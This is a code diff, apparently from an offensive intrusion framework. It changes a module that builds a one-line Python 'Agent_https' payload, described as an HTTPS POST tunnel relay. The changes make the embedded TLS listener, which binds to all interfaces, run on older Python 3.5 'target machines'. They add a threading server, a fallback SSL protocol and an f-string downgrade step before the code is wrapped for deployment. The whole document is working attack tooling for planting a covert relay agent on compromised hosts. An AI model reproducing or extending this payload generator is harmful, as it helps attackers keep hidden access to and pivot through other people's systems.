@@ -10,6 +10,7 @@ import secrets
 from server.core.bootstrap import deploy_command
 from server.s_modules import tls_util
 from server.transports.agent_base import relay_code
+from server.core.pycompat import downgrade_py35
 
 MODULE = {
     "desc": "生成 Agent_https 一句话 python 载荷(HTTPS POST 隧道中继)",
@@ -28,7 +29,7 @@ _DEFAULT_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "output")
 
 _LISTEN_CODE = '''\
-import http.server as _hs,ssl as _sl,tempfile as _t,os as _o
+import http.server as _hs,socketserver as _ss,ssl as _sl,tempfile as _t,os as _o
 class _H(_hs.BaseHTTPRequestHandler):
  protocol_version="HTTP/1.1"
  def log_message(s,*a):
@@ -57,13 +58,15 @@ class _H(_hs.BaseHTTPRequestHandler):
   s.end_headers()
   try:s.wfile.write(out)
   except:pass
+class _THS(_ss.ThreadingMixIn,_hs.HTTPServer):
+ daemon_threads=True
 def run():
  cf=_t.NamedTemporaryFile(delete=False,suffix=".pem");cf.write(_CERT.encode());cf.close()
  kf=_t.NamedTemporaryFile(delete=False,suffix=".pem");kf.write(_KEY.encode());kf.close()
  try:
-  ctx=_sl.SSLContext(_sl.PROTOCOL_TLS_SERVER)
+  ctx=_sl.SSLContext(getattr(_sl,"PROTOCOL_TLS_SERVER",_sl.PROTOCOL_SSLv23))
   ctx.load_cert_chain(cf.name,kf.name)
-  httpd=_hs.ThreadingHTTPServer(("0.0.0.0",_LP),_H)
+  httpd=_THS(("0.0.0.0",_LP),_H)
   httpd.socket=ctx.wrap_socket(httpd.socket,server_side=True)
   httpd.serve_forever()
  finally:
@@ -115,6 +118,7 @@ def run(host, port, server_key_hex=None, out_dir=None, agent_id=None):
     code += _LISTEN_CODE.replace("_CERT", repr(cert["cert_pem"])) \
                         .replace("_KEY", repr(cert["key_pem"])) \
                         .replace("_LP", str(listen_port))
+    code = downgrade_py35(code)   # 目标机 py3.5: f-string → str.format
     compile(code, "<agent_https>", "exec")  # 生成即校验
 
     command = deploy_command(code)
